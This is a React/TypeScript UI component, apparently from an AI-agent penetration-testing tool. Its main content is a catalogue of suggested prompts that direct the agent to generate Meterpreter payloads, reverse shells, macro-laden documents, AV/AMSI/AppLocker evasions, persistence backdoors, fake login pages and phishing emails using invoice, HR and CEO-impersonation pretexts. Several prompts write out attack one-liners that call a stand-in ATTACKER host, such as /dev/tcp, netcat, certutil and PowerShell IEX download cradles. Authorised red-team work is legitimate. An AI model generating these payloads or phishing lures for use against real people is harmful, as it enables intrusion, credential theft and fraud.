/**
 * AI Assistant Drawer - WebSocket Version
 *
 * Real-time bidirectional communication with the agent using WebSocket.
 * Features streaming thoughts, tool executions, and beautiful timeline UI.
 * Single scrollable chat with all messages, thinking, and tool executions inline.
 */

'use client'

import React, { useState, useRef, useEffect, useCallback, KeyboardEvent } from 'react'
import { Send, Bot, User, Loader2, AlertCircle, Sparkles, Plus, Shield, ShieldAlert, Target, Zap, HelpCircle, WifiOff, Wifi, Square, Play, Download, Wrench, History, ChevronDown, EyeOff, Eye, Mail, Copy, Check, Swords, Lightbulb, Settings, X } from 'lucide-react'
import { StealthIcon } from '@/components/icons/StealthIcon'
import ReactMarkdown from 'react-markdown'
import remarkGfm from 'remark-gfm'
import { Prism as SyntaxHighlighter } from 'react-syntax-highlighter'
import { vscDarkPlus } from 'react-syntax-highlighter/dist/esm/styles/prism'
import styles from './AIAssistantDrawer.module.css'
import { useAgentWebSocket } from '@/hooks/useAgentWebSocket'
import {
  MessageType,
  ConnectionStatus,
  type ServerMessage,
  type ApprovalRequestPayload,
  type QuestionRequestPayload,
  type TodoItem
} from '@/lib/websocket-types'
import { AgentTimeline } from './AgentTimeline'
import { FileDownloadCard } from './FileDownloadCard'
import { TodoListWidget } from './TodoListWidget'
import { ConversationHistory } from './ConversationHistory'
import { useConversations } from '@/hooks/useConversations'
import { useChatPersistence } from '@/hooks/useChatPersistence'
import type { Conversation } from '@/hooks/useConversations'
import { Tooltip } from '@/components/ui/Tooltip/Tooltip'
import { AgentBehaviourSection } from '@/components/projects/ProjectForm/sections/AgentBehaviourSection'
import { AttackSkillsSection } from '@/components/projects/ProjectForm/sections/AttackSkillsSection'
import { ToolMatrixSection } from '@/components/projects/ProjectForm/sections/ToolMatrixSection'
import type { Project } from '@prisma/client'
import type { ThinkingItem, ToolExecutionItem, PlanWaveItem, DeepThinkItem } from './AgentTimeline'

type Phase = 'informational' | 'exploitation' | 'post_exploitation'

/** Recursively extract plain text from React children (for copy-to-clipboard). */
function extractTextFromChildren(children: any): string {
  if (children == null) return ''
  if (typeof children === 'string') return children
  if (typeof children === 'number') return String(children)
  if (Array.isArray(children)) return children.map(extractTextFromChildren).join('')
  if (children?.props?.children) return extractTextFromChildren(children.props.children)
  return ''
}

interface Message {
  type: 'message'
  id: string
  role: 'user' | 'assistant'
  content: string
  toolUsed?: string | null
  toolOutput?: string | null
  error?: string | null
  phase?: Phase
  timestamp: Date
  isGuidance?: boolean
  isReport?: boolean
  responseTier?: 'conversational' | 'summary' | 'full_report'
}

interface FileDownloadItem {
  type: 'file_download'
  id: string
  timestamp: Date
  filepath: string
  filename: string
  description: string
  source: string
}

type ChatItem = Message | ThinkingItem | ToolExecutionItem | PlanWaveItem | FileDownloadItem | DeepThinkItem

/** Format prefixed model names for display (e.g. "openrouter/meta-llama/llama-4" → "llama-4 (OR)") */
function formatModelDisplay(model: string): string {
  if (model.startsWith('openai_compat/')) {
    const parts = model.slice('openai_compat/'.length).split('/')
    return `${parts[parts.length - 1]} (OA-Compat)`
  }
  if (model.startsWith('openrouter/')) {
    const parts = model.slice('openrouter/'.length).split('/')
    return `${parts[parts.length - 1]} (OR)`
  }
  if (model.startsWith('bedrock/')) {
    const simplified = model.slice('bedrock/'.length).replace(/^[^.]+\./, '').replace(/-\d{8}-v\d+:\d+$/, '')
    return `${simplified} (Bedrock)`
  }
  return model
}

interface AIAssistantDrawerProps {
  isOpen: boolean
  onClose: () => void
  userId: string
  projectId: string
  sessionId: string
  onResetSession?: () => string
  onSwitchSession?: (sessionId: string) => void
  modelName?: string
  toolPhaseMap?: Record<string, string[]>
  stealthMode?: boolean
  onToggleStealth?: (newValue: boolean) => void
  deepThinkEnabled?: boolean
  onToggleDeepThink?: (newValue: boolean) => void
  onRefetchGraph?: () => void
  isOtherChainsHidden?: boolean
  onToggleOtherChains?: () => void
  hasOtherChains?: boolean
}

const PHASE_CONFIG = {
  informational: {
    label: 'Informational',
    icon: Shield,
    color: '#059669',
    bgColor: 'rgba(5, 150, 105, 0.1)',
  },
  exploitation: {
    label: 'Exploitation',
    icon: Target,
    color: 'var(--status-warning)',
    bgColor: 'rgba(245, 158, 11, 0.1)',
  },
  post_exploitation: {
    label: 'Post-Exploitation',
    icon: Zap,
    color: 'var(--status-error)',
    bgColor: 'rgba(239, 68, 68, 0.1)',
  },
}

const KNOWN_ATTACK_PATH_CONFIG: Record<string, { label: string; shortLabel: string; color: string; bgColor: string }> = {
  cve_exploit: {
    label: 'CVE Exploit',
    shortLabel: 'CVE',
    color: 'var(--status-warning)',
    bgColor: 'rgba(245, 158, 11, 0.15)',
  },
  brute_force_credential_guess: {
    label: 'Brute Force',
    shortLabel: 'BRUTE',
    color: 'var(--accent-secondary, #8b5cf6)',
    bgColor: 'rgba(139, 92, 246, 0.15)',
  },
  phishing_social_engineering: {
    label: 'Phishing / Social Engineering',
    shortLabel: 'PHISH',
    color: 'var(--accent-tertiary, #ec4899)',
    bgColor: 'rgba(236, 72, 153, 0.15)',
  },
}

/** Derive display config for any attack skill type (known, user, or unclassified). */
function getAttackPathConfig(type: string): { label: string; shortLabel: string; color: string; bgColor: string } {
  if (KNOWN_ATTACK_PATH_CONFIG[type]) {
    return KNOWN_ATTACK_PATH_CONFIG[type]
  }
  // User skill: "user_skill:<id>" — derive from the skill name embedded in the type
  if (type.startsWith('user_skill:')) {
    return {
      label: 'User Skill',
      shortLabel: 'SKILL',
      color: 'var(--accent-primary, #3b82f6)',
      bgColor: 'rgba(59, 130, 246, 0.15)',
    }
  }
  // Unclassified: derive label from the type string
  // e.g. "sql_injection-unclassified" -> label "Sql Injection", shortLabel "SI"
  const cleanName = type.replace(/-unclassified$/, '').replace(/_/g, ' ')
  const words = cleanName.split(' ').map(w => w.charAt(0).toUpperCase() + w.slice(1))
  const label = words.join(' ')
  const shortLabel = words.length === 1
    ? label.slice(0, 5).toUpperCase()
    : words.map(w => w[0]).join('').toUpperCase()
  return {
    label: `${label} (Unclassified)`,
    shortLabel,
    color: 'var(--text-secondary, #6b7280)',
    bgColor: 'rgba(107, 114, 128, 0.15)',
  }
}

// =============================================================================
// SOCIAL ENGINEERING SUGGESTION DATA
// =============================================================================

interface SESuggestion { label: string; prompt: string }
interface SESection { osLabel?: string; suggestions: SESuggestion[] }
interface SESubGroup { id: string; title: string; items: SESection[] }

const SOCIAL_ENGINEERING_GROUPS: SESubGroup[] = [
  // ─── 1. Standalone Payloads ───
  {
    id: 'payloads',
    title: 'Standalone Payloads',
    items: [
      {
        osLabel: 'Windows',
        suggestions: [
          { label: 'Meterpreter EXE (reverse_tcp)', prompt: 'Generate a Windows Meterpreter EXE payload and set up the handler — victim triggers the session by double-clicking the .exe file' },
          { label: 'Meterpreter EXE (reverse_https)', prompt: 'Generate a Windows reverse_https Meterpreter EXE payload for encrypted callback and set up the handler — victim triggers by running the .exe file' },
          { label: 'DLL reverse shell (rundll32)', prompt: 'Generate a Windows Meterpreter DLL payload (msfvenom -f dll) and set up the handler — victim triggers by running: rundll32 payload.dll,0' },
          { label: 'MSI installer backdoor', prompt: 'Generate a Windows Meterpreter MSI installer payload (msfvenom -f msi) and set up the handler — victim triggers by double-clicking the .msi installer file' },
          { label: 'Windows Service EXE', prompt: 'Generate a Windows Meterpreter service executable (msfvenom -f exe-service) and set up the handler — victim triggers by installing it as a Windows service via sc create' },
          { label: 'VBScript dropper (.vbs)', prompt: 'Generate a Windows Meterpreter VBScript payload (msfvenom -f vbs) and set up the handler — victim triggers by double-clicking the .vbs file (no Office required)' },
          { label: 'HTA-PSH standalone file', prompt: 'Generate a Windows HTA file with embedded PowerShell payload (msfvenom -f hta-psh) and set up the handler — victim triggers by double-clicking the .hta file' },
          { label: 'Fileless PowerShell (psh-reflection)', prompt: 'Generate a fileless PowerShell (psh-reflection) Meterpreter payload and set up the handler — victim triggers by pasting the command into a PowerShell terminal' },
          { label: 'PowerShell Base64 one-liner', prompt: 'Generate a Windows Meterpreter payload as a PowerShell Base64 one-liner (msfvenom -f psh-cmd) and set up the handler — victim triggers by pasting the powershell -e command into cmd or PowerShell' },
          { label: 'SCR screensaver backdoor', prompt: 'Generate a Windows Meterpreter EXE payload renamed to .scr (screensaver) and set up the handler — victim triggers by double-clicking the .scr file (bypasses some email filters)' },
          { label: 'Batch file dropper (.bat)', prompt: 'Write a Windows batch file that uses certutil to download and execute a Meterpreter payload, and set up the handler — victim triggers by double-clicking the .bat file' },
          { label: 'Encrypted RC4 payload', prompt: 'Generate a Windows Meterpreter reverse_tcp_rc4 encrypted payload for network evasion and set up the handler — victim triggers by running the .exe file' },
        ],
      },
      {
        osLabel: 'Linux',
        suggestions: [
          { label: 'Meterpreter ELF binary (reverse_tcp)', prompt: 'Generate a Linux x64 Meterpreter ELF binary payload and set up the handler — victim triggers by running chmod +x payload.elf && ./payload.elf' },
          { label: 'Shell ELF binary (fallback)', prompt: 'Generate a Linux x64 basic shell ELF binary (linux/x64/shell_reverse_tcp) and set up the handler — victim triggers by executing ./payload.elf' },
          { label: 'Shared object .so (LD_PRELOAD)', prompt: 'Generate a Linux Meterpreter shared object (msfvenom -f elf-so) and set up the handler — victim triggers when any program loads the .so via LD_PRELOAD=./payload.so' },
          { label: 'Bash reverse shell one-liner', prompt: 'Generate a bash reverse shell one-liner (cmd/unix/reverse_bash) and set up the handler — victim triggers by pasting the one-liner into a bash terminal' },
          { label: 'Bash /dev/tcp reverse shell', prompt: 'Generate a bash /dev/tcp reverse shell one-liner and set up the handler — victim triggers by pasting /bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1 into a terminal' },
          { label: 'Python reverse shell one-liner', prompt: 'Generate a Python reverse shell one-liner (cmd/unix/reverse_python) and set up the handler — victim triggers by pasting the python command into a terminal' },
          { label: 'Perl reverse shell one-liner', prompt: 'Generate a Perl reverse shell one-liner (cmd/unix/reverse_perl) and set up the handler — victim triggers by pasting the perl command into a terminal' },
          { label: 'Netcat reverse shell', prompt: 'Generate a netcat reverse shell command and set up the handler — victim triggers by running nc -e /bin/sh ATTACKER 4444 in a terminal' },
          { label: 'Socat encrypted reverse shell', prompt: 'Generate a socat reverse shell with OpenSSL encryption and set up the listener — victim triggers by running the socat command that connects back encrypted' },
          { label: 'OpenSSL encrypted reverse shell', prompt: 'Generate an OpenSSL reverse shell one-liner (mkfifo + openssl s_client) and set up the listener — victim triggers by pasting the command into a terminal' },
          { label: 'C compiled reverse shell', prompt: 'Write a C reverse shell, compile it with gcc in kali_shell, and set up the handler — victim triggers by running the compiled binary ./payload' },
          { label: 'Go compiled reverse shell', prompt: 'Write a Go reverse shell, compile it with go build in kali_shell, and set up the handler — victim triggers by running the compiled binary ./payload' },
        ],
      },
      {
        osLabel: 'macOS',
        suggestions: [
          { label: 'Meterpreter Mach-O binary (reverse_tcp)', prompt: 'Generate a macOS Mach-O Meterpreter reverse_tcp payload and set up the handler — victim triggers by running chmod +x payload && ./payload in Terminal' },
          { label: 'Mach-O reverse_https (encrypted)', prompt: 'Generate a macOS Mach-O Meterpreter reverse_https payload for encrypted callback and set up the handler — victim triggers by executing the binary in Terminal' },
          { label: 'Python reverse shell (Gatekeeper bypass)', prompt: 'Generate a macOS Python reverse shell one-liner (cmd/unix/reverse_python) and set up the handler — victim triggers by pasting the python command into Terminal (bypasses Gatekeeper)' },
          { label: 'Bash reverse shell one-liner', prompt: 'Generate a macOS bash reverse shell one-liner (cmd/unix/reverse_bash) and set up the handler — victim triggers by pasting the command into Terminal' },
          { label: 'Perl reverse shell one-liner', prompt: 'Generate a Perl reverse shell one-liner for macOS and set up the handler — victim triggers by pasting the perl command into Terminal (Perl ships with macOS)' },
          { label: 'AppleScript dropper', prompt: 'Generate a macOS AppleScript one-liner (osascript -e) and set up the handler — victim triggers by pasting the osascript command into Terminal or running a .scpt file' },
        ],
      },
      {
        osLabel: 'Android',
        suggestions: [
          { label: 'Meterpreter APK backdoor', prompt: 'Generate an Android APK backdoor with android/meterpreter/reverse_tcp and set up the handler — victim triggers by installing and opening the APK on their device' },
          { label: 'Trojanized APK (injected into legit app)', prompt: 'Generate an Android APK payload embedded into a legitimate APK (msfvenom -x) and set up the handler — victim triggers by installing the trojanized app' },
          { label: 'APK with reverse_https (encrypted)', prompt: 'Generate an Android reverse_https APK payload for encrypted callback and set up the handler — victim triggers by installing and opening the APK' },
          { label: 'Staged APK (smaller download)', prompt: 'Generate a staged Android APK (android/meterpreter/reverse_tcp) and set up the handler — victim triggers by installing the smaller APK which then downloads the full payload' },
        ],
      },
      {
        osLabel: 'Cross-Platform',
        suggestions: [
          { label: 'Python Meterpreter (cross-platform)', prompt: 'Generate a cross-platform Python Meterpreter payload (python/meterpreter/reverse_tcp) and set up the handler — victim triggers by running python payload.py on any OS' },
          { label: 'Python HTTPS Meterpreter (encrypted)', prompt: 'Generate a cross-platform Python reverse_https Meterpreter payload and set up the handler — victim triggers by running the .py script on any OS with Python' },
          { label: 'Java JAR backdoor', prompt: 'Generate a Java JAR Meterpreter payload (java/meterpreter/reverse_tcp -f jar) and set up the handler — victim triggers by running java -jar payload.jar on any OS with Java' },
          { label: 'Java WAR backdoor (Tomcat / JBoss)', prompt: 'Generate a Java WAR Meterpreter backdoor and set up the handler — victim triggers when the .war is deployed on a Tomcat/JBoss server and a request hits the endpoint' },
          { label: 'PHP Meterpreter (.php file)', prompt: 'Generate a PHP Meterpreter payload (php/meterpreter_reverse_tcp -f raw) and set up the handler — victim triggers when the .php file is accessed via the web server' },
          { label: 'JSP web shell (Java servers)', prompt: 'Generate a JSP reverse shell payload via execute_code and set up the handler — victim triggers when the .jsp file is accessed on a Tomcat/Java app server' },
          { label: 'ASPX Meterpreter (IIS / .NET)', prompt: 'Generate an ASPX Meterpreter payload (msfvenom -f aspx) and set up the handler — victim triggers when the .aspx file is accessed on an IIS/.NET web server' },
          { label: 'Perl reverse shell (cross-platform)', prompt: 'Generate a Perl reverse shell one-liner (cmd/unix/reverse_perl) and set up the handler — victim triggers by pasting the command into a terminal on any OS with Perl' },
        ],
      },
    ],
  },

  // ─── 2. Malicious Documents ───
  {
    id: 'documents',
    title: 'Malicious Documents',
    items: [
      {
        suggestions: [
          { label: 'Word macro document (VBA)', prompt: 'Create a malicious Word document with a VBA macro payload and set up the handler — victim triggers by opening the .docm file and clicking "Enable Macros"' },
          { label: 'Excel macro spreadsheet (VBA)', prompt: 'Create a weaponized Excel spreadsheet with a macro payload and set up the handler — victim triggers by opening the .xlsm file and clicking "Enable Content"' },
          { label: 'PDF exploit (Adobe Reader)', prompt: 'Generate a trojanized PDF file with an embedded payload and set up the handler — victim triggers by opening the .pdf file in Adobe Reader' },
          { label: 'RTF exploit (CVE-2017-0199)', prompt: 'Create a malicious RTF document exploiting CVE-2017-0199 and set up the handler — victim triggers by opening the .rtf file which auto-fetches an HTA payload' },
          { label: 'LNK shortcut file', prompt: 'Generate a malicious Windows shortcut (LNK file) with a reverse shell payload and set up the handler — victim triggers by double-clicking the .lnk shortcut' },
          { label: 'DDE attack (macro-less Office)', prompt: 'Create a Word document using DDE field code to execute a reverse shell and set up the handler — victim triggers by opening the .docx and clicking "Yes" on the DDE prompt (no macros needed)' },
        ],
      },
    ],
  },

  // ─── 3. Web Delivery (Fileless) ───
  {
    id: 'web_delivery',
    title: 'Web Delivery (Fileless)',
    items: [
      {
        osLabel: 'Windows',
        suggestions: [
          { label: 'PowerShell web delivery', prompt: 'Set up a PowerShell web delivery attack (exploit/multi/script/web_delivery TARGET 2) — victim triggers by pasting the generated PowerShell one-liner into cmd or PowerShell' },
          { label: 'Regsvr32 AppLocker bypass', prompt: 'Set up a Regsvr32 web delivery attack (exploit/multi/script/web_delivery TARGET 3) — victim triggers by running the regsvr32 one-liner which bypasses AppLocker restrictions' },
          { label: 'pubprn script bypass', prompt: 'Set up a pubprn web delivery attack (exploit/multi/script/web_delivery TARGET 4) — victim triggers by running the pubprn.vbs one-liner which bypasses script execution policies' },
          { label: 'SyncAppvPublishing bypass', prompt: 'Set up a SyncAppvPublishingServer web delivery (exploit/multi/script/web_delivery TARGET 5) — victim triggers by running the one-liner which bypasses Windows App-V restrictions' },
          { label: 'PSH Binary web delivery', prompt: 'Set up a PSH Binary web delivery (exploit/multi/script/web_delivery TARGET 6) — victim triggers by pasting the PowerShell one-liner that downloads and executes a binary payload' },
          { label: 'HTA delivery server', prompt: 'Create an HTA delivery server (exploit/windows/misc/hta_server) on port 8080 — victim triggers by visiting the HTA URL in their browser and clicking "Run"' },
        ],
      },
      {
        osLabel: 'Linux / macOS',
        suggestions: [
          { label: 'Python web delivery (Linux)', prompt: 'Set up a Python web delivery attack (exploit/multi/script/web_delivery TARGET 0) — Linux victim triggers by pasting the generated python one-liner into a terminal' },
          { label: 'Python web delivery (macOS)', prompt: 'Set up a Python web delivery attack (exploit/multi/script/web_delivery TARGET 0) — macOS victim triggers by pasting the generated python one-liner into Terminal' },
        ],
      },
      {
        osLabel: 'Cross-Platform',
        suggestions: [
          { label: 'Python web delivery (any OS)', prompt: 'Set up a Python web delivery attack (exploit/multi/script/web_delivery TARGET 0) — victim triggers by pasting the python one-liner into a terminal on any OS with Python' },
          { label: 'PHP web delivery (web servers)', prompt: 'Set up a PHP web delivery attack (exploit/multi/script/web_delivery TARGET 1) — victim triggers when the PHP one-liner is executed on a compromised web server' },
          { label: 'HTA server + email link combo', prompt: 'Set up an HTA delivery server on port 8080 (requires chisel tunnel) and send the URL via phishing email — victim triggers by clicking the email link and opening the HTA in their browser' },
        ],
      },
    ],
  },

  // ─── 4. LOLBin & Bypass Techniques ───
  {
    id: 'lolbin',
    title: 'LOLBin & Bypass Techniques',
    items: [
      {
        osLabel: 'Windows Living-off-the-Land',
        suggestions: [
          { label: 'MSHTA URL execution', prompt: 'Set up an HTA payload server and generate a mshta one-liner — victim triggers by running mshta http://ATTACKER:8080/payload.hta in cmd (no file download needed)' },
          { label: 'Certutil download cradle', prompt: 'Generate a Meterpreter EXE, host it via web delivery, and craft a certutil one-liner — victim triggers by running certutil -urlcache -split -f http://ATTACKER/payload.exe && payload.exe' },
          { label: 'Bitsadmin download', prompt: 'Generate a Meterpreter EXE, host it via web delivery, and craft a bitsadmin one-liner — victim triggers by running bitsadmin /transfer job http://ATTACKER/payload.exe c:\\payload.exe' },
          { label: 'PowerShell IEX cradle', prompt: 'Set up a web delivery server and generate a PowerShell IEX cradle — victim triggers by running IEX(New-Object Net.WebClient).DownloadString("http://ATTACKER/payload") in PowerShell' },
          { label: 'WMIC process create', prompt: 'Generate a Base64-encoded PowerShell payload — victim triggers by running wmic process call create "powershell -e BASE64_PAYLOAD" in cmd' },
          { label: 'Regsvr32 SCT scriptlet', prompt: 'Generate a COM scriptlet (.sct) file via execute_code and host it — victim triggers by running regsvr32 /s /n /u /i:http://ATTACKER/payload.sct scrobj.dll (bypasses AppLocker)' },
          { label: 'MSBuild inline task (.xml)', prompt: 'Generate an MSBuild inline task XML file with embedded C# Meterpreter shellcode via execute_code — victim triggers by running MSBuild.exe payload.xml (bypasses AppLocker)' },
          { label: 'Windows Script Host (.wsf)', prompt: 'Generate a Windows Script Host file (.wsf) wrapping a payload via execute_code — victim triggers by double-clicking the .wsf file which runs via wscript.exe' },
        ],
      },
    ],
  },

  // ─── 5. Evasion & Encoding ───
  {
    id: 'evasion',
    title: 'Evasion & Encoding',
    items: [
      {
        osLabel: 'Windows',
        suggestions: [
          { label: 'Encoded EXE (shikata_ga_nai)', prompt: 'Generate a Windows Meterpreter EXE encoded with shikata_ga_nai (5 iterations) for AV evasion and set up the handler — victim triggers by double-clicking the encoded .exe' },
          { label: 'Multi-encode chain (shikata + countdown)', prompt: 'Generate a Windows Meterpreter EXE with chained encoding (shikata_ga_nai + countdown) and set up the handler — victim triggers by running the multi-encoded .exe' },
          { label: 'XOR encoded payload', prompt: 'Generate a Windows Meterpreter EXE encoded with x86/xor for signature evasion and set up the handler — victim triggers by running the encoded .exe file' },
          { label: 'Alpha_mixed alphanumeric shellcode', prompt: 'Generate a Windows Meterpreter payload encoded with x86/alpha_mixed and set up the handler — victim triggers by executing the alphanumeric shellcode (useful for restricted character set exploits)' },
          { label: 'Custom template EXE (-x inject)', prompt: 'Generate a Meterpreter payload injected into a legitimate EXE (msfvenom -x legit.exe -k) and set up the handler — victim triggers by running what looks like a normal application' },
          { label: 'UPX packed EXE', prompt: 'Generate a Windows Meterpreter EXE and pack it with UPX for signature evasion, then set up the handler — victim triggers by running the packed .exe file' },
          { label: 'AMSI bypass + PowerShell payload', prompt: 'Write a PowerShell script that bypasses AMSI before loading Meterpreter shellcode and set up the handler — victim triggers by pasting the script into a PowerShell terminal' },
          { label: 'HTTPS with custom SSL cert', prompt: 'Generate a Meterpreter reverse_https payload with a custom SSL certificate and set up the handler — victim triggers by running the payload which connects back over trusted-looking HTTPS' },
        ],
      },
      {
        osLabel: 'Linux / macOS',
        suggestions: [
          { label: 'Encoded ELF (x64/xor)', prompt: 'Generate a Linux ELF payload encoded with x64/xor for AV evasion and set up the handler — victim triggers by running chmod +x && ./payload.elf' },
          { label: 'Encoded Mach-O (x64/xor)', prompt: 'Generate a macOS Mach-O Meterpreter payload encoded with x64/xor and set up the handler — victim triggers by executing the encoded binary in Terminal' },
        ],
      },
      {
        osLabel: 'Android',
        suggestions: [
          { label: 'Encoded APK (shikata_ga_nai)', prompt: 'Generate an Android APK payload encoded with x86/shikata_ga_nai for AV evasion and set up the handler — victim triggers by installing and opening the encoded APK' },
        ],
      },
      {
        osLabel: 'Advanced',
        suggestions: [
          { label: 'Staged dropper + web delivery', prompt: 'Write a small Python/bash dropper script that fetches the real Meterpreter payload from the web delivery server — victim triggers by running the dropper which downloads and executes the second-stage payload' },
        ],
      },
    ],
  },

  // ─── 6. Credential Harvesting ───
  {
    id: 'credential_harvest',
    title: 'Credential Harvesting',
    items: [
      {
        osLabel: 'Fake Pages (requires chisel tunnel on port 8080)',
        suggestions: [
          { label: 'Fake login page (generic)', prompt: 'Write and serve a fake HTML login page on port 8080 via execute_code that captures credentials — victim triggers by visiting the URL and submitting their username/password' },
          { label: 'Fake Office 365 login', prompt: 'Write and serve a fake Microsoft Office 365 login page on port 8080 via execute_code — victim triggers by visiting the URL and entering their Microsoft credentials' },
          { label: 'Fake VPN portal login', prompt: 'Write and serve a fake Cisco/Fortinet VPN portal login page on port 8080 via execute_code — victim triggers by visiting the URL and entering their VPN credentials' },
          { label: 'Fake software update page', prompt: 'Write and serve a fake "Critical Update Required" page on port 8080 via execute_code — victim triggers by clicking the download button which delivers a Meterpreter payload' },
          { label: 'Fake file download page', prompt: 'Write and serve a fake "Shared Document" download page on port 8080 via execute_code — victim triggers by clicking the download link which delivers a payload' },
          { label: 'Clipboard hijack (pastejacking)', prompt: 'Write and serve an HTML page on port 8080 with JavaScript clipboard hijacking — victim triggers when they copy text from the page and paste a hidden reverse shell command into their terminal' },
        ],
      },
    ],
  },

  // ─── 7. Email Campaigns ───
  {
    id: 'email_campaigns',
    title: 'Email Campaigns',
    items: [
      {
        osLabel: 'Payload Delivery',
        suggestions: [
          { label: 'Send payload via phishing email', prompt: 'Generate a Meterpreter payload and send it via phishing email with an IT support pretext — victim triggers by opening the email attachment and running the payload' },
          { label: 'Send malicious document via email', prompt: 'Generate a malicious Office document and send it via email as an invoice — victim triggers by opening the attachment and enabling macros' },
          { label: 'Software update + payload attachment', prompt: 'Generate a Meterpreter payload and email it as a critical security update from IT — victim triggers by downloading and running the "update" attachment' },
          { label: 'Meeting invite + malicious attachment', prompt: 'Send a phishing email with a meeting invite and a malicious Word macro attachment — victim triggers by opening the .docm attachment and enabling macros' },
        ],
      },
      {
        osLabel: 'Credential Phishing',
        suggestions: [
          { label: 'Password expiry phish', prompt: 'Send a phishing email warning the password expires in 24h with a link to the credential harvesting page — victim triggers by clicking the reset link and entering their credentials' },
          { label: 'IT security alert phish', prompt: 'Send a phishing email about an unusual foreign login with a verification link — victim triggers by clicking the link and entering their credentials on the fake page' },
          { label: 'MFA reset phish', prompt: 'Send a phishing email claiming their MFA device was removed with a re-enroll link — victim triggers by clicking the link and entering their credentials on the fake page' },
          { label: 'Cloud storage share phish', prompt: 'Send a phishing email mimicking a OneDrive/Dropbox sharing notification — victim triggers by clicking the "View Document" link and entering credentials on the fake login page' },
        ],
      },
      {
        osLabel: 'Social Engineering Pretexts',
        suggestions: [
          { label: 'Invoice attachment pretext', prompt: 'Send a phishing email with a fake invoice (malicious Excel macro) from accounting — victim triggers by opening the .xlsm attachment and clicking "Enable Content"' },
          { label: 'Shared document notification', prompt: 'Send a phishing email mimicking a "John shared a document with you" notification — victim triggers by clicking the link and pasting the web delivery one-liner' },
          { label: 'HR policy update pretext', prompt: 'Send a phishing email from HR about a new remote work policy with a malicious Word document — victim triggers by opening the .docm attachment and enabling macros' },
          { label: 'Delivery notification pretext', prompt: 'Send a phishing email mimicking a package delivery notification — victim triggers by clicking the tracking link which points to the payload download or web delivery URL' },
          { label: 'Payment confirmation pretext', prompt: 'Send a phishing email about a $499 payment with a malicious receipt attachment — victim triggers by opening the attachment to "review the transaction"' },
          { label: 'Job application response', prompt: 'Send a phishing email claiming "We would like to schedule an interview" with a malicious attachment — victim triggers by opening the .docm to see the interview details' },
          { label: 'Executive impersonation (CEO fraud)', prompt: 'Send a phishing email impersonating the CEO/CTO with an urgent request and attachment — victim triggers by opening the "confidential" malicious attachment' },
          { label: 'Tax document phish', prompt: 'Send a phishing email claiming a W-2/tax form is ready with a malicious PDF attachment — victim triggers by opening the PDF in Adobe Reader' },
          { label: 'Voicemail notification pretext', prompt: 'Send a phishing email about a new voicemail with a malicious attachment — victim triggers by opening what appears to be an audio player but runs the payload' },
          { label: 'Helpdesk ticket update', prompt: 'Send a phishing email about a resolved helpdesk ticket with a "view details" link — victim triggers by clicking the link which points to the web delivery URL' },
          { label: 'Newsletter with trojan link', prompt: 'Send a phishing email formatted as a company newsletter — victim triggers by clicking one of the links which points to the payload download or web delivery URL' },
        ],
      },
    ],
  },

  // ─── 8. Persistence & Bind Shells ───
  {
    id: 'persistence',
    title: 'Persistence & Bind Shells',
    items: [
      {
        osLabel: 'Persistence Mechanisms',
        suggestions: [
          { label: 'SSH authorized_keys injection (Linux)', prompt: 'Generate an SSH key pair and write an injection script via execute_code — victim triggers unknowingly when the attacker SSHs in using the injected public key at any time' },
          { label: 'Cron job persistence (Linux)', prompt: 'Generate a Meterpreter ELF payload and a crontab installation script via execute_code — victim triggers automatically every hour when cron re-executes the payload' },
          { label: 'Launch Agent persistence (macOS)', prompt: 'Generate a macOS Mach-O Meterpreter payload and a LaunchAgent plist via execute_code — victim triggers automatically when they log in and the Launch Agent starts the payload' },
          { label: '.desktop file autostart (Linux)', prompt: 'Generate a Linux ELF payload and a .desktop autostart entry via execute_code — victim triggers automatically when they log into their desktop session' },
        ],
      },
      {
        osLabel: 'Bind Shells (no tunnel needed)',
        suggestions: [
          { label: 'Windows bind shell EXE', prompt: 'Generate a Windows bind shell payload (windows/meterpreter/bind_tcp) — victim triggers by running the .exe which opens a listening port, then the attacker connects directly' },
          { label: 'Linux bind shell ELF', prompt: 'Generate a Linux bind shell payload (linux/x64/meterpreter/bind_tcp) — victim triggers by running ./payload.elf which opens a listening port, then the attacker connects directly' },
          { label: 'macOS bind shell Mach-O', prompt: 'Generate a macOS bind shell payload (osx/x64/meterpreter/bind_tcp) — victim triggers by running the binary which opens a listening port, then the attacker connects directly' },
          { label: 'Python bind shell (cross-platform)', prompt: 'Generate a cross-platform Python bind shell (python/meterpreter/bind_tcp) — victim triggers by running python payload.py which opens a listening port, then the attacker connects directly' },
        ],
      },
    ],
  },
]

// =============================================================================
// INFORMATIONAL SUGGESTION DATA
// =============================================================================

const INFORMATIONAL_GROUPS: SESubGroup[] = [
  {
    id: 'attack_surface',
    title: 'Attack Surface Overview',
    items: [
      {
        suggestions: [
          { label: 'Full attack surface map', prompt: 'Query the graph to list all domains, subdomains, IP addresses, open ports, and running services. Organize results by domain hierarchy and highlight internet-facing assets.' },
          { label: 'Subdomain enumeration summary', prompt: 'Query the graph for all subdomains and their DNS records (A, AAAA, CNAME, MX, NS, TXT). Identify wildcard DNS, dangling CNAMEs, and potential subdomain takeover candidates.' },
          { label: 'External IP and port inventory', prompt: 'Query the graph for all IP addresses and their open ports with service/version detection. Group by IP and flag uncommon or high-risk ports (e.g., 445, 3389, 6379, 27017).' },
          { label: 'ASN and network mapping', prompt: 'Query the graph for all ASN information, IP ranges, and reverse DNS records. Map out which networks and hosting providers are in scope.' },
          { label: 'CDN and WAF detection summary', prompt: 'Query the graph for all CDN/WAF detections. Identify which assets are behind Cloudflare, Akamai, AWS CloudFront, etc., and which are directly exposed.' },
        ],
      },
    ],
  },
  {
    id: 'vuln_analysis',
    title: 'Vulnerability Analysis',
    items: [
      {
        suggestions: [
          { label: 'Critical and high severity CVEs', prompt: 'Query the graph for all vulnerabilities with CVSS >= 7.0, sorted by severity. For each, show the CVE ID, CVSS score, affected service/technology, and the host where it was found.' },
          { label: 'CISA KEV matches', prompt: 'Query the graph for all discovered CVEs, then use web_search to check which ones appear in the CISA Known Exploited Vulnerabilities catalog. List matches with their required remediation dates.' },
          { label: 'Exploitable CVEs with Metasploit modules', prompt: 'Query the graph for all CVEs found, then use web_search to identify which ones have known Metasploit exploit modules. List the module path, target service, and affected host.' },
          { label: 'Prioritized risk summary', prompt: 'Query the graph for all vulnerabilities, technologies, and exposed services. Create a prioritized risk assessment ranked by: 1) CVSS score, 2) exploit availability, 3) exposure level. Include a top-10 most critical findings table.' },
          { label: 'CVEs with public exploit code', prompt: 'Query the graph for all CVEs, then use web_search to find which have public exploit code on GitHub or ExploitDB. List the CVE, affected asset, and exploit URL for each.' },
        ],
      },
    ],
  },
  {
